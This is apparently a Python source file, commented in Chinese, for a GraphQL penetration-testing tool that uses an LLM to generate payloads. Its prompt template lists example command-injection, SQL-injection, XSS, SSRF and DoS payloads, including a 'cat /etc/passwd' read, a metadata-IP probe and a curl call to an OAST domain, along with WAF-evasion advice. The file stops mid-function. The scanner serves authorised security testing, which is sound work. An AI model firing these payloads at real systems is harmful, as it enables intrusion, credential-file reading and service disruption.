#!/usr/bin/env python3
"""
mcp-GraphQL - Model-assisted Cyber Penetration for GraphQL
一个轻量级、AI 驱动的 GraphQL 自动化漏洞探测工具

仅用于授权渗透测试，请勿对未授权目标使用。
"""

import argparse
import configparser
import json
import os
import sys
import time
from typing import Optional, Dict, Any
from urllib.parse import urljoin

import requests

# =============================================================================
# 全局会话配置（认证 & 代理）
# =============================================================================

class SessionConfig:
    """全局会话配置，管理认证和代理设置"""

    # 真实浏览器 User-Agent
    DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def __init__(self):
        self.headers: Dict[str, str] = {
            "Content-Type": "application/json",
            "User-Agent": self.DEFAULT_USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        }
        self.cookies: Dict[str, str] = {}
        self.proxies: Dict[str, str] = {}
        self.verify_ssl: bool = False

    def add_header(self, header_str: str):
        """添加自定义 Header，格式: 'Name: Value'"""
        if ':' in header_str:
            key, value = header_str.split(':', 1)
            self.headers[key.strip()] = value.strip()

    def add_cookie(self, cookie_str: str):
        """添加 Cookie，格式: 'name=value' 或 'name=value; name2=value2'"""
        for part in cookie_str.split(';'):
            if '=' in part:
                key, value = part.split('=', 1)
                self.cookies[key.strip()] = value.strip()

    def set_proxy(self, proxy_url: str):
        """设置代理，支持 http/https/socks5"""
        if proxy_url:
            self.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

    def load_auth_file(self, filepath: str):
        """
        从 JSON 文件加载认证信息
        文件格式:
        {
            "headers": {"Authorization": "Bearer xxx", "X-API-Key": "xxx"},
            "cookies": {"session": "xxx", "token": "xxx"}
        }
        """
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                auth_data = json.load(f)

            if 'headers' in auth_data:
                for key, value in auth_data['headers'].items():
                    self.headers[key] = value

            if 'cookies' in auth_data:
                for key, value in auth_data['cookies'].items():
                    self.cookies[key] = value

            return True
        except FileNotFoundError:
            return False
        except json.JSONDecodeError:
            return False

    def get_request_kwargs(self, timeout: int = 10) -> Dict[str, Any]:
        """获取 requests 请求参数"""
        kwargs = {
            'headers': self.headers.copy(),
            'timeout': timeout,
            'verify': self.verify_ssl
        }

        if self.cookies:
            kwargs['cookies'] = self.cookies

        if self.proxies:
            kwargs['proxies'] = self.proxies

        return kwargs

    def display_config(self):
        """显示当前配置（隐藏敏感信息）"""
        if len(self.headers) > 1:  # 除了 Content-Type
            log_info("自定义 Headers:")
            for key in self.headers:
                if key != 'Content-Type':
                    value = self.headers[key]
                    # 隐藏敏感值
                    if len(value) > 10:
                        masked = value[:4] + '*' * (len(value) - 8) + value[-4:]
                    else:
                        masked = '****'
                    print(f"       {key}: {masked}")

        if self.cookies:
            log_info(f"Cookies: {len(self.cookies)} 个")

        if self.proxies:
            log_info(f"代理: {self.proxies.get('http', 'None')}")


# 全局会话配置实例
session_config = SessionConfig()

# ANSI 颜色代码
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'


def print_banner():
    """打印工具 Banner"""
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
  ███╗   ███╗ ██████╗██████╗        ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗
  ████╗ ████║██╔════╝██╔══██╗      ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║
  ██╔████╔██║██║     ██████╔╝█████╗██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║
  ██║╚██╔╝██║██║     ██╔═══╝ ╚════╝██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║
  ██║ ╚═╝ ██║╚██████╗██║           ╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
  ╚═╝     ╚═╝ ╚═════╝╚═╝            ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
{Colors.RESET}
{Colors.YELLOW}  Model-assisted Cyber Penetration for GraphQL{Colors.RESET}
{Colors.WHITE}  AI 驱动的 GraphQL 自动化漏洞探测工具{Colors.RESET}
{Colors.RED}  [!] 仅用于授权渗透测试{Colors.RESET}
"""
    print(banner)


def log_info(msg: str):
    print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")


def log_success(msg: str):
    print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")


def log_warning(msg: str):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")


def log_error(msg: str):
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")


def log_vuln(vuln_type: str, msg: str):
    print(f"{Colors.RED}{Colors.BOLD}[VULN]{Colors.RESET} {Colors.MAGENTA}{vuln_type}{Colors.RESET}: {msg}")


# =============================================================================
# 配置文件读取
# =============================================================================

def load_config(config_file: str = 'config.ini') -> dict:
    """从配置文件读取配置"""
    config = {
        'api_key': None,
        'model': None,
        'oast_domain': None,
        'timeout': None
    }

    # 检查配置文件是否存在
    if not os.path.exists(config_file):
        return config

    try:
        parser = configparser.ConfigParser()
        parser.read(config_file, encoding='utf-8')

        # 读取 API 配置
        if parser.has_section('API'):
            if parser.has_option('API', 'dashscope_api_key'):
                api_key = parser.get('API', 'dashscope_api_key')
                if api_key and api_key != 'your_api_key_here':
                    config['api_key'] = api_key
                    log_success(f"从配置文件读取 API Key")

        # 读取 LLM 配置
        if parser.has_section('LLM'):
            if parser.has_option('LLM', 'default_model'):
                model = parser.get('LLM', 'default_model')
                if model:
                    config['model'] = model
                    log_info(f"从配置文件读取模型: {model}")

        # 读取扫描配置
        if parser.has_section('SCAN'):
            if parser.has_option('SCAN', 'default_timeout'):
                try:
                    timeout = parser.getint('SCAN', 'default_timeout')
                    config['timeout'] = timeout
                except ValueError:
                    pass

            if parser.has_option('SCAN', 'default_oast_domain'):
                oast = parser.get('SCAN', 'default_oast_domain')
                if oast and oast != 'example.oastify.com':
                    config['oast_domain'] = oast
                    log_info(f"从配置文件读取 OAST 域名: {oast}")

        return config

    except Exception as e:
        log_warning(f"读取配置文件失败: {e}")
        return config


# =============================================================================
# GraphQL 指纹识别
# =============================================================================

GRAPHQL_PATHS = [
    # 标准路径
    '/graphql',
    '/graphql/',
    '/graphql.php',
    '/graphql.json',

    # API 路径
    '/api/graphql',
    '/api/graphql/',
    '/api/gql',
    '/api/query',
    '/api/data',

    # 版本化 API 路径
    '/v1/graphql',
    '/v2/graphql',
    '/v3/graphql',
    '/v4/graphql',
    '/api/v1/graphql',
    '/api/v2/graphql',
    '/api/v3/graphql',
    '/api/v4/graphql',
    '/v1/gql',
    '/v2/gql',
    '/v1/query',
    '/v2/query',

    # 简写路径
    '/gql',
    '/query',
    '/q',
    '/g',
    '/graph',

    # IDE/调试界面
    '/graphiql',
    '/graphiql/',
    '/playground',
    '/playground/',
    '/altair',
    '/voyager',
    '/explorer',
    '/sandbox',
    '/ide',

    # 控制台
    '/console',
    '/console/graphql',
    '/_console',

    # 管理员/内部路径
    '/admin/graphql',
    '/admin/api/graphql',
    '/admin/gql',
    '/internal/graphql',
    '/private/graphql',
    '/backend/graphql',
    '/dashboard/graphql',

    # Hasura 特有路径
    '/v1alpha1/graphql',
    '/v1beta1/graphql',
    '/v1/relay',

    # AWS AppSync 路径
    '/appsync',
    '/appsync/graphql',

    # Shopify/电商路径
    '/shop/graphql',
    '/storefront/graphql',
    '/api/storefront/graphql',
    '/api/admin/graphql',

    # WordPress/WPGraphQL
    '/wp-graphql',
    '/wp-json/graphql',
    '/index.php/graphql',
    '/index.php?graphql',

    # Drupal GraphQL
    '/drupal/graphql',

    # Magento
    '/magento/graphql',

    # 其他变种
    '/api',
    '/data',
    '/rpc',
    '/hub/graphql',
    '/core/graphql',
    '/service/graphql',
    '/services/graphql',
    '/app/graphql',
    '/server/graphql',
    '/gateway/graphql',
    '/proxy/graphql',

    # 下划线前缀（隐藏路径）
    '/_graphql',
    '/api/_graphql',
    '/_gql',
    '/_query',

    # 子路径变种
    '/graphql/api',
    '/graphql/query',
    '/graphql/v1',
    '/graphql/v2',
    '/graphql/schema',
    '/graphql/explorer',

    # 端口相关（通常用于开发环境）
    '/dev/graphql',
    '/test/graphql',
    '/staging/graphql',
    '/debug/graphql',

    # 移动端 API
    '/mobile/graphql',
    '/m/graphql',
    '/app/api/graphql',

    # 公共/开放 API
    '/public/graphql',
    '/open/graphql',
    '/external/graphql',

    # 认证相关
    '/auth/graphql',
    '/oauth/graphql',

    # 订阅路径（WebSocket）
    '/subscriptions',
    '/graphql/subscriptions',
    '/ws/graphql',
]


def detect_graphql_endpoint(base_url: str, timeout: int = 10) -> Optional[str]:
    """探测 GraphQL 端点（使用全局会话配置）"""
    log_info(f"正在探测 GraphQL 端点: {base_url}")

    # 确保 URL 以 / 结尾
    if not base_url.endswith('/'):
        base_url += '/'

    fingerprint_query = {"query": "query { __typename }"}
    request_kwargs = session_config.get_request_kwargs(timeout)

    for path in GRAPHQL_PATHS:
        url = urljoin(base_url, path.lstrip('/'))
        try:
            response = requests.post(url, json=fingerprint_query, **request_kwargs)
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'data' in data or 'errors' in data:
                        log_success(f"发现 GraphQL 端点: {url}")
                        return url
                except json.JSONDecodeError:
                    pass
        except requests.RequestException:
            pass

    # 尝试 GET 请求
    for path in GRAPHQL_PATHS:
        url = urljoin(base_url, path.lstrip('/'))
        try:
            response = requests.get(url, params={"query": "{ __typename }"}, **request_kwargs)
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'data' in data or 'errors' in data:
                        log_success(f"发现 GraphQL 端点 (GET): {url}")
                        return url
                except json.JSONDecodeError:
                    pass
        except requests.RequestException:
            pass

    log_error("未发现 GraphQL 端点")
    return None


# =============================================================================
# 内省查询获取 Schema（完整版）
# =============================================================================

# 完整的内省查询 - 获取所有类型、字段、参数、枚举、接口等
INTROSPECTION_QUERY_FULL = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
"""

# 简化版内省查询（用于快速扫描或完整版失败时的回退）
INTROSPECTION_QUERY_SIMPLE = """
query IntrospectionQuery {
  __schema {
    mutationType {
      name
      fields {
        name
        description
        args {
          name
          description
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
    queryType {
      name
      fields {
        name
        description
        args {
          name
          description
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
  }
}
"""


def fetch_introspection(endpoint: str, timeout: int = 10) -> Optional[dict]:
    """
    获取 GraphQL 内省数据（使用全局会话配置）

    先尝试完整内省查询，如果失败则回退到简化版本
    """
    log_info("正在获取 GraphQL Schema (完整内省查询)...")

    request_kwargs = session_config.get_request_kwargs(timeout)

    # 首先尝试完整内省查询
    try:
        response = requests.post(
            endpoint,
            json={"query": INTROSPECTION_QUERY_FULL},
            **request_kwargs
        )

        if response.status_code == 200:
            data = response.json()
            if 'data' in data and data['data'].get('__schema'):
                schema = data['data']['__schema']
                # 检查是否获取到了完整的类型信息
                if schema.get('types'):
                    log_success(f"成功获取完整 Schema（{len(schema['types'])} 个类型）")
                    return schema
    except requests.RequestException:
        pass

    # 完整查询失败，尝试简化版本
    log_warning("完整内省查询失败，尝试简化版本...")

    try:
        response = requests.post(
            endpoint,
            json={"query": INTROSPECTION_QUERY_SIMPLE},
            **request_kwargs
        )

        if response.status_code == 200:
            data = response.json()
            if 'data' in data and data['data'].get('__schema'):
                log_success("成功获取 Schema（简化版）")
                return data['data']['__schema']
            elif 'errors' in data:
                log_warning(f"内省查询被禁用或出错: {data['errors']}")
                return None
    except requests.RequestException as e:
        log_error(f"获取 Schema 失败: {e}")

    return None


def extract_type_info(schema: dict) -> dict:
    """
    从完整 Schema 中提取类型信息

    Returns:
        dict: 包含以下信息:
            - object_types: 对象类型及其字段
            - input_types: 输入类型
            - enums: 枚举类型及其值
            - interfaces: 接口类型
            - scalars: 标量类型
    """
    type_info = {
        'object_types': {},
        'input_types': {},
        'enums': {},
        'interfaces': {},
        'scalars': [],
        'unions': {}
    }

    types = schema.get('types', [])
    if not types:
        return type_info

    for t in types:
        name = t.get('name', '')
        kind = t.get('kind', '')

        # 跳过内置类型
        if name.startswith('__'):
            continue

        if kind == 'OBJECT':
            fields = {}
            for field in t.get('fields', []) or []:
                field_name = field.get('name', '')
                field_type = get_type_name(field.get('type', {}))
                fields[field_name] = {
                    'type': field_type,
                    'args': [arg.get('name') for arg in field.get('args', []) or []]
                }
            type_info['object_types'][name] = fields

        elif kind == 'INPUT_OBJECT':
            input_fields = {}
            for field in t.get('inputFields', []) or []:
                field_name = field.get('name', '')
                field_type = get_type_name(field.get('type', {}))
                input_fields[field_name] = field_type
            type_info['input_types'][name] = input_fields

        elif kind == 'ENUM':
            enum_values = [v.get('name') for v in t.get('enumValues', []) or []]
            type_info['enums'][name] = enum_values

        elif kind == 'INTERFACE':
            fields = {}
            for field in t.get('fields', []) or []:
                field_name = field.get('name', '')
                field_type = get_type_name(field.get('type', {}))
                fields[field_name] = field_type
            type_info['interfaces'][name] = fields

        elif kind == 'SCALAR':
            type_info['scalars'].append(name)

        elif kind == 'UNION':
            possible_types = [pt.get('name') for pt in t.get('possibleTypes', []) or []]
            type_info['unions'][name] = possible_types

    return type_info


def get_type_name(type_obj: dict, depth: int = 0) -> str:
    """递归获取类型名称"""
    if not type_obj or depth > 7:
        return 'Unknown'

    kind = type_obj.get('kind', '')
    name = type_obj.get('name', '')

    if kind == 'NON_NULL':
        inner = get_type_name(type_obj.get('ofType', {}), depth + 1)
        return f"{inner}!"
    elif kind == 'LIST':
        inner = get_type_name(type_obj.get('ofType', {}), depth + 1)
        return f"[{inner}]"
    elif name:
        return name
    elif type_obj.get('ofType'):
        return get_type_name(type_obj.get('ofType', {}), depth + 1)

    return 'Unknown'


def get_return_type_fields(schema: dict, type_name: str) -> list:
    """获取某个类型的所有可用字段名"""
    types = schema.get('types', [])

    for t in types:
        if t.get('name') == type_name:
            fields = t.get('fields', []) or []
            return [f.get('name') for f in fields if f.get('name')]

    return ['__typename']  # 默认返回 __typename 作为安全的子选择


# =============================================================================
# Schema 解析
# =============================================================================

# 参数风险映射（基于 DVGA 和 GraphQL 常见漏洞）
RISK_PATTERNS = {
    'ssrf': ['host', 'url', 'endpoint', 'uri', 'path', 'target', 'site', 'domain', 'server', 'address', 'link', 'redirect', 'fetch', 'load', 'import', 'callback', 'webhook'],
    'rce': ['cmd', 'command', 'script', 'exec', 'execute', 'run', 'shell', 'system', 'process', 'eval', 'code', 'payload', 'expression'],
    'sqli': ['id', 'userid', 'user_id', 'username', 'email', 'query', 'filter', 'search', 'where', 'order', 'sort', 'limit', 'offset', 'name'],
    'xss': ['content', 'message', 'comment', 'title', 'description', 'text', 'html', 'body', 'input', 'value', 'data'],
    'path_traversal': ['filename', 'file', 'path', 'filepath', 'directory', 'dir', 'folder', 'name', 'download', 'upload', 'template', 'include'],
    'info_leak': ['password', 'token', 'secret', 'key', 'admin', 'private', 'credential', 'auth', 'session', 'cookie', 'apikey', 'api_key'],
    'authz_bypass': ['role', 'permission', 'admin', 'isadmin', 'is_admin', 'privilege', 'access', 'authorize'],
    'idor': ['id', 'userid', 'user_id', 'objectid', 'object_id', 'resourceid', 'resource_id'],
    'dos': ['limit', 'depth', 'size', 'count', 'amount', 'batch', 'recursive']
}


def analyze_param_risk(param_name: str) -> list:
    """分析参数名的潜在风险"""
    risks = []
    param_lower = param_name.lower()

    for risk_type, patterns in RISK_PATTERNS.items():
        for pattern in patterns:
            if pattern in param_lower:
                risks.append(risk_type)
                break

    return risks


def extract_type_fields_from_schema(schema: dict) -> dict:
    """
    从完整内省数据中提取所有类型的可用字段

    Returns:
        dict: 类型名 -> 字段列表 的映射
    """
    type_fields = {}

    # 这里我们从 mutationType 和 queryType 推断返回类型的字段
    # 由于当前内省查询只获取了 mutationType 和 queryType，
    # 我们收集已知的字段信息

    # 添加通用安全字段（几乎所有 GraphQL 对象都支持）
    type_fields['__default__'] = ['__typename', 'id']

    return type_fields


def parse_mutations(schema: dict) -> list:
    """解析 Schema 中的 Mutations（支持完整和简化内省格式）"""
    mutations = []

    mutation_type = schema.get('mutationType')
    if not mutation_type:
        return mutations

    # 获取 mutation 字段列表
    fields = None

    # 格式1：简化内省（直接包含 fields）
    if mutation_type.get('fields'):
        fields = mutation_type['fields']
    # 格式2：完整内省（需要从 types 中查找）
    elif mutation_type.get('name') and schema.get('types'):
        type_name = mutation_type['name']
        for t in schema['types']:
            if t.get('name') == type_name:
                fields = t.get('fields', [])
                break

    if not fields:
        return mutations

    log_info(f"发现 {len(fields)} 个 Mutations")

    for field in fields:
        mutation = {
            'name': field['name'],
            'description': field.get('description', ''),
            'args': [],
            'risks': []
        }

        for arg in field.get('args', []) or []:
            # 处理类型信息（完整格式可能嵌套更深）
            arg_type = arg.get('type', {})
            type_name = get_type_name(arg_type) if arg_type else 'Unknown'

            arg_info = {
                'name': arg['name'],
                'description': arg.get('description', ''),
                'type': type_name,
                'risks': analyze_param_risk(arg['name'])
            }
            mutation['args'].append(arg_info)
            mutation['risks'].extend(arg_info['risks'])

        mutation['risks'] = list(set(mutation['risks']))
        mutations.append(mutation)

    return mutations


def parse_queries(schema: dict) -> list:
    """解析 Schema 中的 Queries（支持完整和简化内省格式）"""
    queries = []

    query_type = schema.get('queryType')
    if not query_type:
        return queries

    # 获取 query 字段列表
    fields = None

    # 格式1：简化内省（直接包含 fields）
    if query_type.get('fields'):
        fields = query_type['fields']
    # 格式2：完整内省（需要从 types 中查找）
    elif query_type.get('name') and schema.get('types'):
        type_name = query_type['name']
        for t in schema['types']:
            if t.get('name') == type_name:
                fields = t.get('fields', [])
                break

    if not fields:
        return queries

    log_info(f"发现 {len(fields)} 个 Queries")

    for field in fields:
        query = {
            'name': field['name'],
            'description': field.get('description', ''),
            'args': [],
            'risks': []
        }

        for arg in field.get('args', []) or []:
            # 处理类型信息（完整格式可能嵌套更深）
            arg_type = arg.get('type', {})
            type_name = get_type_name(arg_type) if arg_type else 'Unknown'

            arg_info = {
                'name': arg['name'],
                'description': arg.get('description', ''),
                'type': type_name,
                'risks': analyze_param_risk(arg['name'])
            }
            query['args'].append(arg_info)
            query['risks'].extend(arg_info['risks'])

        query['risks'] = list(set(query['risks']))
        queries.append(query)

    return queries


def display_schema_analysis(mutations: list, queries: list, schema: dict = None):
    """显示 Schema 分析结果（包含完整类型信息）"""
    print(f"\n{Colors.CYAN}{'='*60}")
    print(f"Schema 分析结果")
    print(f"{'='*60}{Colors.RESET}\n")

    # 显示完整类型信息（如果有）
    if schema and schema.get('types'):
        type_info = extract_type_info(schema)

        # 统计信息
        stats = []
        if type_info['object_types']:
            stats.append(f"{len(type_info['object_types'])} 个对象类型")
        if type_info['input_types']:
            stats.append(f"{len(type_info['input_types'])} 个输入类型")
        if type_info['enums']:
            stats.append(f"{len(type_info['enums'])} 个枚举类型")
        if type_info['interfaces']:
            stats.append(f"{len(type_info['interfaces'])} 个接口")
        if type_info['scalars']:
            stats.append(f"{len(type_info['scalars'])} 个标量")

        if stats:
            print(f"{Colors.BOLD}Schema 统计:{Colors.RESET} {', '.join(stats)}\n")

        # 显示重要的枚举类型（可能用于 Payload 构造）
        if type_info['enums']:
            print(f"{Colors.BOLD}枚举类型 (可用于 Payload):{Colors.RESET}")
            for enum_name, values in list(type_info['enums'].items())[:5]:
                print(f"  - {Colors.MAGENTA}{enum_name}{Colors.RESET}: {', '.join(values[:5])}" +
                      (f"... (+{len(values)-5})" if len(values) > 5 else ""))
            if len(type_info['enums']) > 5:
                print(f"  ... 还有 {len(type_info['enums'])-5} 个枚举类型")
            print()

        # 显示输入类型（了解参数结构）
        if type_info['input_types']:
            print(f"{Colors.BOLD}输入类型 (参数结构):{Colors.RESET}")
            for input_name, fields in list(type_info['input_types'].items())[:3]:
                print(f"  - {Colors.CYAN}{input_name}{Colors.RESET}:")
                for field_name, field_type in list(fields.items())[:5]:
                    print(f"      {field_name}: {field_type}")
                if len(fields) > 5:
                    print(f"      ... (+{len(fields)-5} 个字段)")
            if len(type_info['input_types']) > 3:
                print(f"  ... 还有 {len(type_info['input_types'])-3} 个输入类型")
            print()

    if mutations:
        print(f"{Colors.BOLD}Mutations:{Colors.RESET}")
        for m in mutations:
            risk_str = f" {Colors.RED}[风险: {', '.join(m['risks'])}]{Colors.RESET}" if m['risks'] else ""
            print(f"  - {Colors.GREEN}{m['name']}{Colors.RESET}{risk_str}")
            for arg in m['args']:
                arg_risk = f" {Colors.YELLOW}({', '.join(arg['risks'])}){Colors.RESET}" if arg['risks'] else ""
                print(f"      {arg['name']}: {arg['type']}{arg_risk}")

    if queries:
        print(f"\n{Colors.BOLD}Queries (敏感):{Colors.RESET}")
        sensitive_queries = [q for q in queries if q['risks'] or any(kw in q['name'].lower() for kw in ['user', 'admin', 'password', 'token', 'secret', 'private'])]
        for q in sensitive_queries[:10]:  # 只显示前10个
            risk_str = f" {Colors.RED}[风险: {', '.join(q['risks'])}]{Colors.RESET}" if q['risks'] else ""
            print(f"  - {Colors.GREEN}{q['name']}{Colors.RESET}{risk_str}")
        if len(sensitive_queries) > 10:
            print(f"  ... 还有 {len(sensitive_queries)-10} 个敏感 Query")


# =============================================================================
# LLM 集成
# =============================================================================

def format_mutations_for_llm(mutations: list, queries: list = None) -> str:
    """格式化 Mutations 和 Queries 供 LLM 分析"""
    lines = []

    # 格式化 Mutations
    if mutations:
        lines.append("## Mutations:")
        for m in mutations:
            args_str = ", ".join([f"{a['name']}: {a['type']}" for a in m['args']])
            lines.append(f"- {m['name']}({args_str})")
            if m['risks']:
                lines.append(f"  潜在风险: {', '.join(m['risks'])}")

    # 格式化 Queries
    if queries:
        lines.append("\n## Queries:")
        for q in queries:
            args_str = ", ".join([f"{a['name']}: {a['type']}" for a in q['args']])
            lines.append(f"- {q['name']}({args_str})")
            if q['risks']:
                lines.append(f"  潜在风险: {', '.join(q['risks'])}")

    return "\n".join(lines)


def build_llm_prompt(mutations_text: str, oast_domain: str, iteration: int = 1, previous_attempts: list = None) -> str:
    """构建 LLM 提示词（支持智能迭代）"""

    base_prompt = f"""你是一名 GraphQL 安全专家。你的任务是对以下 GraphQL Schema 进行智能渗透测试。

# ⚠️ 重要：字段构造规则（必须遵守）
1. **不要假设任何字段存在** - 你不知道目标 GraphQL 的完整 Schema
2. **不要随意猜测子字段** - 如 token、user、author、data 等字段可能不存在
3. **优先使用 `__typename`** - 当需要子选择时，始终使用 `{{ __typename }}` 作为安全的子选择
4. **只使用 Schema 中明确列出的字段和参数**
5. **如果响应类型不明确，使用 `{{ __typename }}` 而不是猜测字段名**

# GraphQL Schema（仅使用以下已知的 mutations/queries 和参数）
{mutations_text}

# 漏洞测试目标
请生成针对以下漏洞类型的测试 Payload（基于 DVGA 靶机标准）：

1. **SSRF（服务端请求伪造）**
   - 使用 OAST 域名: {oast_domain}
   - 测试内网访问、云元数据（169.254.169.254）

2. **RCE（远程代码/命令注入）** - 多种检测方法
   **时间盲注型**:
   - `sleep 5` - Linux 延时
   - `ping -c 5 127.0.0.1` - ping 延时
   - `Start-Sleep -Seconds 5` - Windows PowerShell

   **回显检测型**（优先使用，结果更明确）:
   - `whoami` - 返回用户名（root, www-data, administrator 等）
   - `id` - 返回 uid=xxx, gid=xxx
   - `hostname` - 返回主机名
   - `uname -a` - 返回系统信息
   - `cat /etc/passwd` - 返回用户列表（Linux）
   - `echo MCP_RCE_VULNERABLE` - 自定义标记
   - `dir` / `ipconfig` - Windows 命令

   **OAST 型**:
   - `curl {oast_domain}` - 外连检测
   - `nslookup {oast_domain}` - DNS 查询

3. **SQL 注入**
   - 布尔盲注: ' OR 1=1 --
   - 时间盲注: ' AND SLEEP(5) --
   - Union 注入

4. **XSS（存储型/反射型）**
   - Script 标签: <script>alert(1)</script>
   - 事件处理: <img src=x onerror=alert(1)>
   - 编码绕过

5. **未授权访问/权限提升**
   - 尝试修改 admin/role 参数
   - IDOR: 修改 id 访问他人资源

6. **信息泄露**
   - 查询敏感字段（password, token, secret）
   - 枚举用户/数据

7. **DoS（拒绝服务）**
   - 批量查询（Batch Query Attack）
   - 深度递归查询（Deep Recursion）

# 输出格式要求
1. 每个 payload 前标注类型标签: [SSRF], [RCE], [SQLi], [XSS], [AUTHZ], [IDOR], [INFO_LEAK], [DOS]
2. 只输出合法 GraphQL 语法，不要解释
3. Payload 要有创意，尝试绕过常见防护
4. **子选择必须使用 `{{ __typename }}`，不要使用其他假设的字段名**
5. **RCE 请优先使用回显命令（whoami, id 等），而不仅仅是 sleep**

# 正确示例（使用 __typename）
[SSRF]
mutation {{ importPaste(host: "{oast_domain}", port: 80, path: "/") {{ __typename }} }}

[RCE] - 时间盲注型
mutation {{ systemDiagnostics(cmd: "sleep 5") {{ __typename }} }}

[RCE] - 回显检测型（优先使用）
mutation {{ systemDiagnostics(cmd: "whoami") {{ __typename }} }}
mutation {{ systemDiagnostics(cmd: "id") {{ __typename }} }}
mutation {{ systemDiagnostics(cmd: "echo MCP_RCE_VULNERABLE") {{ __typename }} }}

[SQLi]
query {{ user(id: "1' OR '1'='1") {{ __typename }} }}

[IDOR]
query {{ paste(id: 1001) {{ __typename }} }}

# 错误示例（不要这样做）
mutation {{ importPaste(host: "{oast_domain}") {{ result author {{ username }} }} }}  # 错误：假设存在 author 字段
query {{ user(id: 1) {{ token password email }} }}  # 错误：假设存在 token/password/email 字段
"""

    # 如果是第2轮及以后，添加之前的尝试和分析
    if iteration > 1 and previous_attempts:
        base_prompt += f"\n\n# 🔄 智能迭代（第 {iteration} 轮）\n"
        base_prompt += "你之前已经尝试过以下 Payload，但未成功或需要改进：\n\n"

        for attempt in previous_attempts[-5:]:  # 显示最近5次尝试
            base_prompt += f"## 尝试 #{attempt['round']}\n"
            base_prompt += f"**Payload**: {attempt['payload'][:200]}...\n"
            base_prompt += f"**响应**: HTTP {attempt.get('status_code', 'N/A')}\n"
            base_prompt += f"**响应内容**: {attempt.get('response_snippet', 'N/A')}\n"

            # 添加错误修复信息
            if attempt.get('error_fixed'):
                base_prompt += f"**已自动修复**: 是 (方法: {attempt.get('fix_method', 'unknown')})\n"
                if attempt.get('original_payload'):
                    base_prompt += f"**原始 Payload**: {attempt['original_payload'][:200]}...\n"

            base_prompt += f"**分析**: {attempt.get('analysis', '无明显漏洞特征')}\n\n"

        base_prompt += """
# 🧠 改进策略
基于上述响应分析和错误修复记录，请：
1. **严格遵守字段规则** - 只使用 `__typename` 作为子选择，不要猜测字段名
2. 避免重复之前出错的 GraphQL 语法错误（子选择缺失、未知字段等）
3. 调整 Payload 绕过可能的过滤/WAF
4. 尝试不同的编码方式（URL编码、Unicode、Base64等）
5. 使用不同的注入点和参数组合
6. 如果看到错误信息，利用错误信息优化 Payload（参考自动修复的结果）
7. 如果响应正常但无漏洞，尝试更隐蔽的测试方法
8. **确保所有 Payload 使用 `{{ __typename }}` 作为子选择**

生成新的、更智能的 Payload（记住：使用 __typename）：
"""

    return base_prompt


def call_qwen_api(prompt: str, api_key: str, model: str = 'qwen-turbo', timeout: int = 60) -> Optional[str]:
    """调用阿里云 DashScope Qwen API（带超时控制）"""
    import concurrent.futures

    def _call_api():
        import dashscope
        from dashscope import Generation

        dashscope.api_key = api_key

        # 如果 model 只是 'qwen'，默认使用 qwen-turbo
        actual_model = model
        if model.lower() == 'qwen':
            actual_model = 'qwen-turbo'

        response = Generation.call(
            model=actual_model,
            prompt=prompt,
            result_format='text'
        )

        if response.status_code == 200:
            return response.output.text
        else:
            raise Exception(f"API 错误: {response.code} - {response.message}")

    try:
        log_info(f"正在调用 Qwen API ({model}) 生成 Payload...（超时: {timeout}秒）")

        # 使用线程池执行，带超时控制
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
            future = executor.submit(_call_api)
            try:
                result = future.result(timeout=timeout)
                return result
            except concurrent.futures.TimeoutError:
                log_error(f"⏰ Qwen API 调用超时（>{timeout}秒），请检查网络连接或 API 状态")
                return None

    except ImportError:
        log_error("请安装 dashscope: pip install dashscope")
        return None
    except Exception as e:
        log_error(f"Qwen API 调用异常: {e}")
        return None


def call_ollama_api(prompt: str, model: str = "llama3", timeout: int = 120) -> Optional[str]:
    """调用本地 Ollama API（带超时控制）"""
    try:
        log_info(f"正在调用 Ollama ({model}) 生成 Payload...（超时: {timeout}秒）")

        response = requests.post(
            "http://localhost:11434/api/generate",
            json={
                "model": model,
                "prompt": prompt,
                "stream": False
            },
            timeout=timeout
        )

